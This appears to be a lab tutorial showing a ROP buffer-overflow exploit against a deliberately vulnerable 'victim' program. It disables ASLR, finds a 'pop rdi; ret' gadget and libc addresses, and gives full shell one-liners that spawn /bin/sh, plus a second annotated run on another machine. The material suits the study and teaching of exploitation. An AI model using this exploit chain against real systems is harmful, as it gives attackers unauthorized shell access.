# This is a demo of ROP attack with just shell script.
# Tested on Ubuntu 14.04 with Linux Linux 3.19.0-25-generic.
# UPDATE: Tested this on Arch with Linux 4.8.7-1. Still good!

#### Stack Layout ####
    string /bin/sh
----------------------
    addr of system()
----------------------
    addr of string "/bin/sh"
----------------------
 addr of pop rdi; ret
----------------------
     EBP Register
----------------------
     64 bytes buf
######################

1. Compile the code:
	$ gcc -fno-stack-protector -o victim victim.c

2. Disable ASLR: 
	$ echo 0 > /proc/sys/kernel/randomize_va_space 

3. Address of buffer can be obtained via (e.g., 7fffffffdc20)
	$ ./victim

4. Gadget "pop  %rdi ; retq" can be obtained via:
	$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi

    (Note: git clone https://github.com/JonathanSalwan/ROPgadget if you don't have it)

Result: 0x0000000000022b1a : pop rdi ; ret

5. Base address of libc text can be obtained via /proc/pid/maps, e.g., 0x7ffff7a15000 

6. Offset of system() in libc can be obtained via (e.g., 0x46640):
	$ nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep '\<system\>'

7. Make the final exploit:

buffer: 0x7fffffffdc20 
libc base: 0x7ffff7a15000
system: 0x7ffff7a15000 + 0x46640 = 0x7ffff7a5b640 
gadgets: 0x7ffff7a15000 + 0x22b1a = 0x7ffff7a37b1a
bash: 0x7fffffffdc20 + 64d + 8d + 24d = 0x7fffffffdc80 

(((printf %0144d 0; printf %016x 0x7ffff7a37b1a | tac -rs..; printf %016x 0x7fffffffdc80 | tac -rs..; printf %016x 0x7ffff7a5b640 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim

After pressing Enter twice, we will have a shell.
Notes: exploit.py is the python script implementing what's mentioned above. Run: $ ( ./exploit.py ; cat ) | ./victim

##################
### START MINE ###
##################

# Note: My libc is: /usr/lib/libc.so.6

# ROPgadget --binary /usr/lib/libc.so.6 --only "pop|ret" | grep rdi
# --> 0x000000000001fc1a : pop rdi ; ret

### NOTE: May need to re-get the buffer value each time,
### and then re-compute the address where we'll be putting bash.
### That's all pretty easy though. ;)

buffer: 0x7fffffffe040
libc base: 0x7ffff7a3c000
system: 0x7ffff7a3c000 + 0x03f4d0 = 0x7ffff7a7b4d0
gadgets: 0x7ffff7a3c000 + 0x01fc1a = 0x7ffff7a5bc1a
bash: 0x7fffffffe040 + hex(64+8+24) = 0x7fffffffe070

buffer="$(printf '\n\n' | ./victim | head -n 1)"
bash_string_addr="$(python -c "print(hex($buffer + 64+8+24))")"
(((printf %0144d 0; printf %016x 0x7ffff7a5bc1a | tac -rs..; printf %016x $bash_string_addr | tac -rs..; printf %016x 0x7ffff7a7b4d0 | tac -rs.. ; echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | ./victim

# HOLY FUCK IT WORKS!!! ROP is great. ^___^

################
### END MINE ###
################
